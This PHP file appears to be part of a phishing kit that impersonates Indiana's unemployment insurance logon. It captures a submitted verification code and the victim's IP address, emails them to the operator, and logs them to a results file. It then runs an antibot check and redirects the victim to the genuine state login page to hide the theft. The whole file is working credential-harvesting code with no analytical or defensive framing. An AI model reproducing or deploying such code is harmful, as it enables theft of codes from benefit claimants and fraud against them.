<?php
$Cashout = getenv("REMOTE_ADDR");
include('../Email.php');
$subject = "INDIANA UI INFO of [ " . $Cashout . " ] /";
$headers = "From: Cashout-XXX <service>\r\n";
$message .= "
+----/!\----<.![+] INDIANA UI CODE  [+]!.>---/!\----+
 [CODE]           : ".$_POST['1']."
-------------------------------------------------
+----/!\----<.![+] IP GEOINFO  [+]!.>---/!\----+
 [IP] :  https://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."
+----/!\----<.! icq @716199390!.>---/!\----+>
\n";
mail($email,$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
$xxx = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
require './antibot.php';header("Location: https://nullreferer.com/?https://uplink.in.gov/CSS/CSSLogon.htm");
?>

